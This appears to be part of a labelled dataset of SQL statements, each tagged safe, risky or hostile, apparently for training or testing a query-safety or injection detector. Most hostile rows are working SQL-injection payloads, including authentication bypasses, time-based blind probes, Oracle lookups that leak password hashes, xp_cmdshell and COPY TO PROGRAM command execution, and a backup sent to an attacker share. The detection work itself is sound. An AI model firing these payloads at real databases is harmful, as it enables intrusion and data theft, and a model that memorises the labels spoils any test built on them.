+464,sl_time_blind,hostile,"SELECT id, name FROM sessions WHERE name = 'a' waitfor delay '0:0:10'--"
+465,sl_auth_bypass,hostile,"SELECT id, code FROM users WHERE code = 'root' or '1'='1'#"
+466,data_exfil,hostile,"SELECT user, host, authentication_string FROM mysql.user"
+467,admin_op,risky,GRANT DROP ON sessions.* TO 'app'@'%'
+468,sl_error_based,hostile,"SELECT id, email FROM orders WHERE email = ',(SELECT 3271 FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq')) USING utf8))))x)"
+469,sl_generic,hostile,"SELECT id, code FROM products WHERE code = 'admin"" --"
+470,schema_change,risky,ALTER TABLE products MODIFY COLUMN created_at VARCHAR(32) NOT NULL
+471,sl_auth_bypass,hostile,"SELECT id, email FROM members WHERE email = 'root' or 1=1"
+472,sl_generic,hostile,"SELECT * FROM orders WHERE id = 1 or 0=0 #"""
+473,unbounded_write,risky,UPDATE products SET updated_at = '2026-08-20'
+474,write_bounded,safe,"INSERT INTO carts (shop_id, name) VALUES (27, 'Carol Wu')"
+475,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM coupons a JOIN reviews b ON b.user_id = a.id WHERE a.updated_at >= '2026-03-15' GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+476,sl_auth_bypass,hostile,"SELECT id, email FROM orders WHERE email = 'root') or ('1'='1'--"
+477,sl_generic,hostile,"SELECT * FROM products WHERE id = 1 or 1=1 or """"="
+478,read_join_agg,safe,"SELECT a.shop_id, COUNT(b.id) AS cnt FROM refunds a JOIN users b ON b.user_id = a.id WHERE a.updated_at >= '2026-08-20' GROUP BY a.shop_id ORDER BY cnt DESC LIMIT 50"
+479,sl_time_blind,hostile,"SELECT id, title FROM users WHERE title = '"" or sleep(5)#"
+480,sl_time_blind,hostile,SELECT * FROM members WHERE id = 1 ;WAITFOR DELAY '0:0:5'
+481,read_simple,safe,"SELECT created_at, status FROM carts WHERE created_at >= '2026-01-01' LIMIT 100"
+482,write_bounded,safe,"INSERT INTO users (status, shop_id) VALUES ('active', 364)"
+483,write_bounded,safe,"INSERT INTO carts (amount, status) VALUES (8.00, 'active')"
+484,sl_mssql,hostile,"SELECT id, name FROM members WHERE name = '' or 1=1 --"
+485,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM sessions a JOIN sessions b ON b.user_id = a.id WHERE a.created_at >= '2026-06-30' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+486,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM payments a JOIN carts b ON b.shop_id = a.id WHERE a.email = 'alice@example.com' GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
+487,sl_oracle,hostile,"SELECT id, title FROM sessions WHERE title = ''||utl_http.request('httP://192.168.1.1/')||'"
+488,sl_file_enum,hostile,"SELECT id, name FROM members WHERE name = 'BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'"
+489,sl_stacked,hostile,"SELECT * FROM users WHERE id = 1 ;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+490,sl_generic,hostile,"SELECT id, code FROM users WHERE code = 'admin"") or ""1""=""1""#"
+491,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 AND GTID_SUBSET(CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),3271)"
+492,orm_inject,hostile,SELECT u FROM User u WHERE u.name = '' OR 1=1 --'
+493,unbounded_write,risky,UPDATE payments SET title = 'VIP Upgrade'
+494,read_join_agg,safe,"SELECT a.shop_id, COUNT(b.id) AS cnt FROM carts a JOIN refunds b ON b.user_id = a.id WHERE a.user_id = 3 GROUP BY a.shop_id ORDER BY cnt DESC LIMIT 50"
+495,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 BEGIN IF (3271=3271) THEN DBMS_LOCK.SLEEP(5); ELSE DBMS_LOCK.SLEEP(0); END IF; END;
+496,sl_auth_bypass,hostile,"SELECT id, email FROM products WHERE email = 'ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 ceil(pi())*ceil(version()) 24"
+497,read_simple,safe,"SELECT id, status FROM carts WHERE user_id = 1204 LIMIT 10"
+498,admin_op,risky,REVOKE DROP ON carts FROM 'app'@'%'
+499,write_bounded,safe,DELETE FROM refunds WHERE id = 317 AND shop_id = 364
+500,sl_time_blind,hostile,SELECT * FROM sessions WHERE (username = 'x')) or sleep(5)='
+501,admin_op,risky,GRANT DROP ON shops.* TO 'analytics'@'%'
+502,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = 'a'"
+503,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM users a JOIN reviews b ON b.user_id = a.id WHERE a.shop_id = 11 GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+504,admin_op,risky,REVOKE SELECT ON sessions FROM 'analytics'@'%'
+505,sl_generic,hostile,"SELECT id, name FROM accounts WHERE name = '||'6"
+506,sl_auth_bypass,hostile,"SELECT id, title FROM sessions WHERE title = 'root' or '1'='1"
+507,sl_generic,hostile,SELECT * FROM products WHERE (name = 'x'') or true--
+508,sl_oracle,hostile,"SELECT id, name FROM orders WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i"
+509,legit_lookalike,safe,"SELECT id, last_login FROM users WHERE email = 'alice@example.com'"
+510,sl_generic,hostile,"SELECT id, title FROM users WHERE title = '%27%20or%201=1"
+511,sl_error_based,hostile,SELECT * FROM members WHERE id = 1 OR 3271=UTL_INADDR.GET_HOST_ADDRESS('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM DUAL)||'qpbxq')
+512,sl_generic,hostile,"SELECT id, email FROM sessions WHERE email = ''%20or%20''='"
+513,sl_time_blind,hostile,"SELECT id, name FROM products WHERE name = '(3271=3271 AND !SLEEP(5))"
+514,sl_auth_bypass,hostile,"SELECT id, title FROM users WHERE title = '' and mid(data,1,1) = 'a'#"
+515,union_based,hostile,SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members
+516,sl_generic,hostile,"SELECT id, title FROM members WHERE title = '""*"""
+517,stacked,hostile,SELECT * FROM members; DROP TABLE members--
+518,sl_generic,hostile,"SELECT id, title FROM orders WHERE title = '"" or 1=1--"
+519,write_bounded,safe,"INSERT INTO coupons (updated_at, user_id) VALUES ('2026-03-15', 1204)"
+520,sl_auth_bypass,hostile,"SELECT id, title FROM members WHERE title = 'root') or '1'='1'--"
+521,sl_auth_bypass,hostile,"SELECT * FROM products WHERE id = 1 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0"
+522,admin_op,risky,GRANT INSERT ON sessions.* TO 'readonly'@'%'
+523,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = '?id=1'0x00and0x00select0x00*0x00from0x00"
+524,sl_auth_bypass,hostile,"SELECT id, username FROM users WHERE username = 'id=08Eunion select user fr1om/*./*/admin%23"
+525,sl_generic,hostile,SELECT * FROM members WHERE (name = 'x'') or ('a'='a
+526,sl_stacked,hostile,"SELECT * FROM sessions WHERE id = 1 ;SELECT DBMS_PIPE.RECEIVE_MESSAGE(''qxjkp'',5) FROM DUAL"
+527,sl_error_based,hostile,"SELECT * FROM members WHERE id = 1 OR GTID_SUBSET(CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq'),3271)"
+528,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM coupons a JOIN products b ON b.user_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+529,sl_generic,hostile,SELECT * FROM users WHERE id = 1 or true--
+530,sl_boolean_blind,hostile,"SELECT * FROM users WHERE id = 1 AND (SELECT (CASE WHEN (3271=3271) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3271) END) FROM DUAL) IS NULL"
+531,sl_oracle,hostile,"SELECT id, username FROM accounts WHERE username = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i"
+532,sl_generic,hostile,"SELECT id, name FROM members WHERE name = 'â or 3=3 --"
+533,sl_auth_bypass,hostile,"SELECT id, username FROM members WHERE username = ''and(true)like(false)union(select(pass)from(users))#"
+534,read_join_agg,safe,"SELECT a.email, COUNT(b.id) AS cnt FROM coupons a JOIN shops b ON b.user_id = a.id WHERE a.created_at >= '2026-01-01' GROUP BY a.email ORDER BY cnt DESC LIMIT 50"
+535,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 AND !SLEEP(5)
+536,admin_op,risky,GRANT DROP ON carts.* TO 'etl'@'%'
+537,json_sqli,hostile,SELECT * FROM t WHERE id=1;SELECT json_agg(password) FROM users
+538,read_simple,safe,"SELECT name, updated_at FROM users WHERE created_at >= '2026-06-30' LIMIT 50"
+539,sl_generic,hostile,"SELECT id, code FROM users WHERE code = '; exec ('sel' + 'ect us' + 'er')"
+540,write_bounded,safe,"INSERT INTO sessions (created_at, name) VALUES ('2026-01-01', 'Carol Wu')"
+541,schema_change,risky,ALTER TABLE reviews DROP COLUMN email
+542,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM payments a JOIN refunds b ON b.user_id = a.id WHERE a.id = 42 GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+543,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = 'admin' --"
+544,read_simple,safe,"SELECT name, status FROM orders WHERE status = 'pending' LIMIT 10"
+545,sl_generic,hostile,"SELECT id, email FROM members WHERE email = 'admin"") or (""1""=""1"
+546,sl_file_enum,hostile,SELECT * FROM products WHERE id = 1 select @@version
+547,sl_time_blind,hostile,"SELECT id, name FROM members WHERE name = ',(SELECT (CASE WHEN (3271=3271) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)"
+548,sl_time_blind,hostile,"SELECT id, email FROM products WHERE email = 'IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|""XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR""*/"
+549,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM reviews a JOIN orders b ON b.shop_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+550,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM orders a JOIN sessions b ON b.user_id = a.id WHERE a.updated_at >= '2026-08-20' GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+551,sl_generic,hostile,"SELECT id, email FROM accounts WHERE email = '' '"
+552,write_bounded,safe,DELETE FROM reviews WHERE id = 2048 AND amount = 19.99
+553,sl_boolean_blind,hostile,"SELECT id, name FROM orders WHERE name = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"
+554,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM users a JOIN orders b ON b.shop_id = a.id WHERE a.updated_at >= '2026-03-15' GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+555,sl_generic,hostile,SELECT * FROM products WHERE (email = 'x')%20or%20('x'='x
+556,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 or 1=1--
+557,sl_time_blind,hostile,"SELECT * FROM products WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"
+558,sl_error_based,hostile,"SELECT * FROM orders WHERE id = 1 OR 1 GROUP BY CONCAT('qjvkq',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END)),'qpbxq',FLOOR(RAND(0)*2)) HAVING MIN(0)"
+559,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = 'id=1/*/\*/and/*/\*/ascii%28substring%28user%28%29,1,1%29%29=114"
+560,write_bounded,safe,DELETE FROM products WHERE id = 9912 AND name = 'Daniel Ma'
+561,sl_time_blind,hostile,"SELECT * FROM users WHERE id = 1)) or benchmark(10000000,MD5(1))#"
+562,admin_op,risky,REVOKE DELETE ON refunds FROM 'migration'@'%'
+563,sl_file_enum,hostile,SELECT * FROM users WHERE id = 1 exec master..xp_cmdshell 'ping+<attackerip>'
+564,admin_op,risky,REVOKE ALTER ON carts FROM 'app'@'%'
+565,sl_generic,hostile,SELECT * FROM members WHERE id = 1 or 1=1 or ''='
+566,sl_auth_bypass,hostile,"SELECT id, code FROM orders WHERE code = '' and substr(data from 1 for 1) = 'a'#"
+567,read_simple,safe,"SELECT status, created_at FROM sessions WHERE user_id = 1204 LIMIT 20"
+568,read_join_agg,safe,"SELECT a.name, COUNT(b.id) AS cnt FROM shops a JOIN shops b ON b.user_id = a.id WHERE a.user_id = 501 GROUP BY a.name ORDER BY cnt DESC LIMIT 50"
+569,sl_error_based,hostile,"SELECT id, title FROM products WHERE title = ',(SELECT 3271 FROM (SELECT ROW(3271,4471)>(SELECT COUNT(*),CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq',FLOOR(RAND(0)*2))x FROM (SELECT 8812 UNION SELECT 1 UNION SELECT 1 UNION SELECT 1)a GROUP BY x))s)"
+570,sl_error_based,hostile,SELECT * FROM orders WHERE id = 1 AND 3271=('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qpbxq')
+571,sl_auth_bypass,hostile,"SELECT id, email FROM accounts WHERE email = 'root' --"
+572,legit_lookalike,safe,SELECT SLEEP(0)
+573,sl_time_blind,hostile,SELECT * FROM accounts WHERE id = 1 ;waitfor delay '0:0:5'--
+574,sl_auth_bypass,hostile,"SELECT id, username FROM products WHERE username = '' and substr(data,1,1) = 'a'#"
+575,read_simple,safe,"SELECT title, shop_id FROM shops WHERE shop_id = 27 LIMIT 20"
+576,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = 'root"" or ""1""=""1""/*"
+577,sl_error_based,hostile,SELECT * FROM sessions WHERE id = 1 OR 3271=ZEROIFNULL(CAST('qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'qpbxq' AS NUMERIC))
+578,sl_time_blind,hostile,"SELECT id, username FROM users WHERE username = ';(SELECT * FROM (SELECT(SLEEP(5)))'qxjkp')"
+579,sl_generic,hostile,"SELECT id, name FROM members WHERE name = ''"
+580,read_simple,safe,"SELECT email, amount FROM users WHERE id = 1 LIMIT 100"
+581,unbounded_write,risky,UPDATE reviews SET title = 'Free Shipping'
+582,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 OR 3271=(SELECT count() FROM numbers(5) WHERE sleepEachRow(1)=0 SETTINGS max_block_size=1)
+583,second_order,hostile,INSERT INTO users (name) VALUES ('admin''--')
+584,sl_generic,hostile,SELECT * FROM orders WHERE id = 1 declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+585,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM coupons a JOIN products b ON b.user_id = a.id WHERE a.name = 'Carol Wu' GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
+586,admin_op,risky,REVOKE UPDATE ON payments FROM 'etl'@'%'
+587,unbounded_write,risky,UPDATE carts SET title = 'VIP Upgrade'
+588,sl_auth_bypass,hostile,"SELECT id, name FROM sessions WHERE name = 'inject_string=--%00%27+union%20select%20GROUP_CONCAT(DISTINCT%20table_name)%20from%20information_schema.tables%20where%20table_schema=0x73716C6F6C%23+&sanitize_quotes=none&blacklist_level=none&blacklist_keywords=&query_results=all_rows&error_level=verbose&location=where_string&submit=%D7%A2%C9%E4%21"
+589,sl_generic,hostile,"SELECT id, username FROM users WHERE username = ' or 1=1 --"
+590,sl_auth_bypass,hostile,"SELECT id, title FROM products WHERE title = 'floor(version()) 5 ceil(pi()*pi()+version()) 15 floor(pi()*(version()+pi())) 25"
+591,read_simple,safe,"SELECT title, email FROM coupons WHERE created_at >= '2026-01-01' LIMIT 10"
+592,sl_generic,hostile,"SELECT id, code FROM products WHERE code = ''^'"
+593,sl_generic,hostile,"SELECT id, name FROM members WHERE name = 'admin') or ('1'='1'/*"
+594,read_join_agg,safe,"SELECT a.title, COUNT(b.id) AS cnt FROM coupons a JOIN coupons b ON b.shop_id = a.id WHERE a.email = 'carol@mail.com' GROUP BY a.title ORDER BY cnt DESC LIMIT 50"
+595,sl_auth_bypass,hostile,SELECT * FROM sessions WHERE id = 1' union/*--*/select/*--*/1
+596,sl_time_blind,hostile,"SELECT id, email FROM sessions WHERE email = '(SELECT (CASE WHEN (3271=3271) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 3271 END))"
+597,sl_generic,hostile,SELECT * FROM sessions WHERE id = 1 declare @s varchar (8000) select @s = 0x73656c ...
+598,schema_change,risky,ALTER TABLE products MODIFY COLUMN email VARCHAR(32) NOT NULL
+599,graphql_sqli,hostile,SELECT * FROM posts WHERE author_id = (SELECT id FROM users WHERE name='a' OR SLEEP(3))
+600,write_bounded,safe,"INSERT INTO reviews (created_at, updated_at) VALUES ('2026-06-30', '2025-12-31')"
+601,sl_time_blind,hostile,"SELECT * FROM users WHERE id = 1 OR ''qxjkp''=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(3271),0),5000000000),NULL)"
+602,sl_auth_bypass,hostile,"SELECT id, email FROM orders WHERE email = 'root"" or 1=1"
+603,read_join_agg,safe,"SELECT a.updated_at, COUNT(b.id) AS cnt FROM products a JOIN coupons b ON b.user_id = a.id WHERE a.amount = 19.99 GROUP BY a.updated_at ORDER BY cnt DESC LIMIT 50"
+604,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = 'true+true 2 ceil(pi()+pi()+version()) 12 ceil(pi()*ceil(pi()+pi())) 22"
+605,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = '"" or """"&"""
+606,read_simple,safe,"SELECT updated_at, title FROM coupons WHERE status = 'active' LIMIT 10"
+607,read_simple,safe,"SELECT shop_id, created_at FROM products WHERE title = 'VIP Upgrade' LIMIT 20"
+608,sl_auth_bypass,hostile,"SELECT * FROM products WHERE id = 1'and 0x61=(/*foo*/SELECT mid(pass,1,1) from users limit 1,1)and'1"
+609,read_join_agg,safe,"SELECT a.id, COUNT(b.id) AS cnt FROM products a JOIN sessions b ON b.shop_id = a.id WHERE a.amount = 19.99 GROUP BY a.id ORDER BY cnt DESC LIMIT 50"
+610,sl_oracle,hostile,"SELECT id, name FROM users WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i"
+611,sl_auth_bypass,hostile,"SELECT * FROM members WHERE id = 1' and if(ascii(substr((select{1d user()}),1,1))>11,sleep(1),1)"
+612,unbounded_write,risky,UPDATE shops SET updated_at = '2026-08-20'
+613,write_bounded,safe,"INSERT INTO orders (shop_id, status) VALUES (27, 'refunded')"
+614,admin_op,risky,GRANT SELECT ON shops.* TO 'etl'@'%'
+615,sl_time_blind,hostile,SELECT * FROM sessions WHERE (code = 'x') or pg_sleep(5)--
+616,sl_generic,hostile,"SELECT id, code FROM orders WHERE code = 'hi') or ('a'='a"
+617,sl_boolean_blind,hostile,"SELECT id, username FROM products WHERE username = '(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 3271 END) FROM SYSMASTER:SYSDUAL)"
+618,schema_change,risky,DROP TABLE reviews
+619,unbounded_write,risky,UPDATE orders SET status = 'refunded'
+620,write_bounded,safe,"INSERT INTO refunds (user_id, name) VALUES (1204, 'Bob Lee')"
+621,admin_op,risky,GRANT ALL PRIVILEGES ON products.* TO 'app'@'%'
+622,sl_time_blind,hostile,SELECT * FROM orders WHERE id = 1 ;SELECT PG_SLEEP(5)
+623,sl_oracle,hostile,"SELECT id, name FROM products WHERE name = '' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i"
+624,write_bounded,safe,UPDATE sessions SET title = 'Summer Sale' WHERE id = 9912
+625,sl_boolean_blind,hostile,"SELECT id, username FROM users WHERE username = '(SELECT * FROM GENERATE_SERIES(3271,3271,CASE WHEN (3271=3271) THEN 1 ELSE 0 END) LIMIT 1)"
+626,sl_generic,hostile,"SELECT id, email FROM orders WHERE email = '""a"""" or 1=1--"""
+627,read_simple,safe,"SELECT name, status FROM users WHERE title = 'Welcome Coupon' LIMIT 10"
+628,sl_boolean_blind,hostile,"SELECT * FROM members WHERE id = 1 AND MAKE_SET(3271=3271,4471)"
+629,sl_auth_bypass,hostile,"SELECT id, username FROM accounts WHERE username = 'xx select xxx, 1e1from xxx //select user,password from mysql.user where user = 'root' and 1=1e1union select user,1e1from mysql.user;"
+630,auth_bypass,hostile,SELECT * FROM members WHERE id = 5-1
+631,write_bounded,safe,UPDATE shops SET amount = 19.99 WHERE id = 1
+632,unbounded_write,risky,UPDATE orders SET status = 'pending'
+633,sl_auth_bypass,hostile,"SELECT id, code FROM members WHERE code = 'id=8E0union/*.1*/select{x user}from{x users}%23"
+634,sl_time_blind,hostile,SELECT * FROM products WHERE id = 1 ;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x
+635,write_bounded,safe,UPDATE carts SET title = 'Welcome Coupon' WHERE id = 100
+636,patt_postgres,hostile,SELECT * FROM t WHERE id = 1 OR 1=1; COPY (SELECT '') TO PROGRAM 'id'
+637,sl_boolean_blind,hostile,"SELECT id, username FROM users WHERE username = ',(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"
+638,error_based,hostile,"SELECT * FROM t WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)"
+639,unbounded_write,risky,UPDATE coupons SET status = 'active'
+640,sl_generic,hostile,"SELECT id, code FROM accounts WHERE code = 'x' AND 1=(SELECT COUNT(*) FROM tabname); --"
+641,sl_oracle,hostile,"SELECT id, email FROM products WHERE email = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i"
+642,sl_auth_bypass,hostile,SELECT * FROM accounts WHERE id = 1 and--!!!1=- -!!!1
+643,schema_change,risky,ALTER TABLE orders MODIFY COLUMN status VARCHAR(32) NOT NULL
+644,sl_auth_bypass,hostile,"SELECT id, username FROM orders WHERE username = 'id=/*' union select 1,2 from users%23*/"
+645,sl_error_based,hostile,"SELECT * FROM accounts WHERE id = 1 AND EXP(~(SELECT * FROM (SELECT CONCAT('qjvkq',(SELECT (ELT(3271=3271,1))),'qpbxq','x'))x))"
+646,sl_generic,hostile,"SELECT id, name FROM orders WHERE name = '/**/or/**/1/**/=/**/1"
+647,sl_boolean_blind,hostile,"SELECT id, email FROM orders WHERE email = 'MAKE_SET(3271=3271,1)"
+648,sl_oracle,hostile,"SELECT id, code FROM products WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i"
+649,write_bounded,safe,DELETE FROM shops WHERE id = 1 AND status = 'paid'
+650,write_bounded,safe,"INSERT INTO shops (title, created_at) VALUES ('Welcome Coupon', '2026-09-01')"
+651,write_bounded,safe,UPDATE orders SET amount = 8.00 WHERE id = 100
+652,read_simple,safe,"SELECT name, created_at FROM carts WHERE updated_at >= '2025-12-31' LIMIT 20"
+653,unbounded_write,risky,UPDATE carts SET updated_at = '2026-08-20'
+654,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 OR 3271=RAISE_ERROR('70001','qjvkq'||(SELECT (CASE WHEN (3271=3271) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'qpbxq')"
+655,schema_change,risky,ALTER TABLE users DROP COLUMN name
+656,admin_op,risky,GRANT UPDATE ON carts.* TO 'readonly'@'%'
+657,read_simple,safe,"SELECT email, status FROM sessions WHERE id = 2048 LIMIT 50"
+658,sl_generic,hostile,"SELECT id, title FROM products WHERE title = '"" or ""a""=""a"
+659,sl_oracle,hostile,"SELECT id, code FROM accounts WHERE code = '' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i"
+660,unbounded_write,risky,UPDATE carts SET updated_at = '2026-03-15'
+661,read_simple,safe,"SELECT status, name FROM reviews WHERE user_id = 501 LIMIT 20"
+662,read_join_agg,safe,"SELECT a.created_at, COUNT(b.id) AS cnt FROM carts a JOIN refunds b ON b.user_id = a.id WHERE a.amount = 1299.00 GROUP BY a.created_at ORDER BY cnt DESC LIMIT 50"
+663,write_bounded,safe,DELETE FROM orders WHERE id = 1 AND user_id = 501
+664,sl_error_based,hostile,"SELECT * FROM users WHERE id = 1 AND 3271=CONCAT('qjvkq',(SELECT (CASE WHEN (3271=3271) THEN '1' ELSE '0' END)),'qpbxq')"
+665,write_bounded,safe,"INSERT INTO payments (id, updated_at) VALUES (1, '2025-12-31')"
+666,schema_change,risky,ALTER TABLE payments MODIFY COLUMN shop_id VARCHAR(32) NOT NULL
+667,legit_lookalike,safe,SELECT name FROM shops WHERE name = 'O''Brien Coffee'
+668,legit_lookalike,safe,SELECT 1
+669,unbounded_write,risky,UPDATE orders SET status = 'active'
+670,sl_time_blind,hostile,"SELECT id, name FROM accounts WHERE name = '(SELECT (CASE WHEN (3271=3271) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 3271 END) FROM DUAL)"
+671,write_bounded,safe,"INSERT INTO coupons (id, created_at) VALUES (9912, '2026-01-01')"
+672,write_bounded,safe,UPDATE orders SET updated_at = '2026-08-20' WHERE id = 9912
+673,sl_time_blind,hostile,"SELECT id, title FROM members WHERE title = ',(SELECT (CASE WHEN (3271=3271) THEN SLEEP(5) ELSE 3271 END))"
+674,sl_time_blind,hostile,"SELECT * FROM users WHERE id = 1 OR 3271=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)"
+675,unbounded_write,risky,UPDATE users SET status = 'refunded'
+676,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = '<username>'--"
+677,sl_auth_bypass,hostile,"SELECT id, name FROM orders WHERE name = 'root"" #"
+678,sl_auth_bypass,hostile,"SELECT id, email FROM sessions WHERE email = '%26%261=1"
+679,read_simple,safe,"SELECT email, created_at FROM products WHERE user_id = 3 LIMIT 100"
+680,sl_auth_bypass,hostile,"SELECT id, code FROM sessions WHERE code = 'id=08Eunion select 1,2,3%23"
+681,sl_error_based,hostile,SELECT * FROM products WHERE id = 1 AND 3271=('qjvkq'||(SELECT CASE 3271 WHEN 3271 THEN CODE(49) ELSE CODE(48) END)||'qpbxq')
+682,read_join_agg,safe,"SELECT a.amount, COUNT(b.id) AS cnt FROM reviews a JOIN carts b ON b.shop_id = a.id WHERE a.amount = 19.99 GROUP BY a.amount ORDER BY cnt DESC LIMIT 50"
+683,admin_op,risky,GRANT ALTER ON orders.* TO 'app'@'%'
+684,sl_auth_bypass,hostile,"SELECT id, name FROM users WHERE name = 'ceil(version()) 6 floor(pi()*version()) 16 floor(version()*version()) 26"
+685,schema_change,risky,ALTER TABLE refunds DROP COLUMN user_id
+686,sl_boolean_blind,hostile,"SELECT * FROM orders WHERE id = 1 OR EXTRACTVALUE(3271,CASE WHEN (3271=3271) THEN 3271 ELSE 0x3A END)"
+687,read_simple,safe,"SELECT title, user_id FROM shops WHERE created_at >= '2026-09-01' LIMIT 50"
+688,read_join_agg,safe,"SELECT a.user_id, COUNT(b.id) AS cnt FROM sessions a JOIN orders b ON b.user_id = a.id WHERE a.created_at >= '2026-06-30' GROUP BY a.user_id ORDER BY cnt DESC LIMIT 50"
+689,sl_generic,hostile,SELECT * FROM products WHERE id = 1 or '1'='1
+690,data_exfil,hostile,SELECT * FROM users WHERE 1 = 1
+691,admin_op,risky,GRANT ALTER ON orders.* TO 'etl'@'%'
+692,sl_generic,hostile,"SELECT id, code FROM orders WHERE code = 'admin"" or 1=1"
